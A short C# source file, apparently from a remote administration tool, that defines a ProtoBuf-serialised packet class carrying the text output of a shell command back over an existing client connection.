using ProtoBuf;

namespace xServer.Core.Packets.ClientPackets
{
    [ProtoContract]
    public class ShellCommandResponse : IPacket
    {
        [ProtoMember(1)]
        public string Output { get; set; }

        public ShellCommandResponse()
        {
        }

        public ShellCommandResponse(string output)
        {
            this.Output = output;
        }

        public void Execute(Client client)
        {
            client.Send<ShellCommandResponse>(this);
        }
    }
}